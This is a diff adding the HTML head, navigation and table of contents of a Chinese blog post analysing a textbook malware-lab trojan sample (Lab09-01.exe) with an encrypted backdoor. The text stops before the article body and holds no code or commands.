@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="baidu-site-verification" content="code-n4alrUzr1E" />
+    <meta name="description" content="详细分析本文首发于跳跳糖社区，原文链接: https:&#x2F;&#x2F;tttang.com&#x2F;archive&#x2F;1342&#x2F; 0x00 前言样本地址：https:&#x2F;&#x2F;github.com&#x2F;0range-x&#x2F;Virus-sample&#x2F;blob&#x2F;master&#x2F;Chapter_9L&#x2F;Lab09-01.exe是书中的一个案例样本，木马加了启动参数，还有启动密码，尝试分析木马的功能和行为 首先crack掉木马的启动密码，根据">
+<meta property="og:type" content="article">
+<meta property="og:title" content="加密后门的木马分析">
+<meta property="og:url" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="0r@nge の窝">
+<meta property="og:description" content="详细分析本文首发于跳跳糖社区，原文链接: https:&#x2F;&#x2F;tttang.com&#x2F;archive&#x2F;1342&#x2F; 0x00 前言样本地址：https:&#x2F;&#x2F;github.com&#x2F;0range-x&#x2F;Virus-sample&#x2F;blob&#x2F;master&#x2F;Chapter_9L&#x2F;Lab09-01.exe是书中的一个案例样本，木马加了启动参数，还有启动密码，尝试分析木马的功能和行为 首先crack掉木马的启动密码，根据">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116095315886.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116095433324.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117094657231.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116111303286.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116111511180.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116111640282.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116111836468.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117095143083.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117095438337.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116112158064.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116112320840.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116114057640.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117104049309.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117110341950.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117113544736.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117111630925.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116121130243.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116121243071.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116121949288.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116143954688.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116145310014.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117114542540.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117115033632.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117115200115.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117115243204.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117145158822.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117150722663.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116172953326.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116173821127.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117152044299.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117153003646.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117153851502.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117153921844.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117154049962.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116172003090.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116172353688.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116173949704.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116180114934.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117171453200.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117155145688.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117155443290.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117155628148.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117155715725.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117155916159.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117160129452.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117160405653.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117160524042.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117160800094.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117161510708.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117161739076.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117162149075.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117162356923.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117163119830.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117095906406.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116113808502.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117172231871.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117172440164.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117172810303.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117172934212.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117173449780.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117173633852.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117173830307.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117174117602.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117175420932.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117175456369.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117231628485.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117231732413.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117232340334.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117233653687.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211117234434791.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211118000720718.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116154949368.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116155018687.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116155617453.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116155805936.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116161003640.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116161751006.png">
+<meta property="og:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116164950265.png">
+<meta property="article:published_time" content="2021-12-10T07:28:10.000Z">
+<meta property="article:modified_time" content="2021-12-10T10:36:50.072Z">
+<meta property="article:author" content="0r@nge">
+<meta property="article:tag" content="后门">
+<meta property="article:tag" content="病毒">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/image-20211116095315886.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/icon.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/icon.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/icon.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>加密后门的木马分析</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="0r@nge の窝" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/links">Links</a></li><!--
+     --><!--
+       --><li><a href="/atom.xml">RSS</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/12/19/%E6%9C%A8%E9%A9%AC%E5%B8%B8%E7%94%A8dllapi%E5%87%BD%E6%95%B0/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/12/03/%E7%9F%AD%E6%9C%9F%E8%A7%84%E5%88%92%E5%8F%8A%E5%8F%8D%E6%80%9D/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&text=加密后门的木马分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&title=加密后门的木马分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&is_video=false&description=加密后门的木马分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=加密后门的木马分析&body=Check out this article: https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&title=加密后门的木马分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&title=加密后门的木马分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&title=加密后门的木马分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&title=加密后门的木马分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&name=加密后门的木马分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0range-x.github.io/2021/12/10/%E5%8A%A0%E5%AF%86%E5%90%8E%E9%97%A8%E7%9A%84%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/&t=加密后门的木马分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">详细分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">2.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%A4%A7%E8%87%B4%E6%B5%8F%E8%A7%88"><span class="toc-number">3.</span> <span class="toc-text">0x01 大致浏览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">0x02 详细分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E5%A5%8F"><span class="toc-number">4.1.</span> <span class="toc-text">前奏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#in"><span class="toc-number">4.2.</span> <span class="toc-text">-in</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re"><span class="toc-number">4.3.</span> <span class="toc-text">-re</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#c"><span class="toc-number">4.4.</span> <span class="toc-text">-c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cc"><span class="toc-number">4.5.</span> <span class="toc-text">-cc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82"><span class="toc-number">4.6.</span> <span class="toc-text">无参</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8Dcrack%E5%AF%86%E7%A0%81abcd%E5%A7%BF%E5%8A%BF"><span class="toc-number">4.7.</span> <span class="toc-text">另一种crack密码abcd姿势</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-number">4.8.</span> <span class="toc-text">0x03 总结</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        加密后门的木马分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">0r@nge</span>
+      </span>
+      
+    <div class="postdate">
+      
